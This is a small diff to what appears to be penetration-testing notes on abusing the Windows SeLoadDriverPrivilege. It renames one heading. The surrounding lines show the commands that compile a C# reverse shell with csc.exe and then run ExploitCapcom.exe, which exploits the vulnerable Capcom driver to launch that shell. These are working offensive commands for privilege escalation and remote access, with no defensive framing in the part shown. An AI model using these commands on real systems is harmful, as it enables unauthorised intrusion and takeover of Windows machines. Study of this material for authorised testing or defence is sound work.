@@ -29,7 +29,7 @@ Quickly compile C# reverse shell.
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:exe /out:C:\pentest\SeLoadDriverPrivilege\rev.exe C:\pentest\SeLoadDriverPrivilege\rev.cs
 ```
 
-## Exploit vulnerable driver
+## Compile the exploit and execute arbitrary vulnerable driver
 Exploit the vulnerable driver and execute the binary of your choice
 ```
 .\ExploitCapcom.exe C:\pentest\SeLoadDriverPrivilege\rev.exe
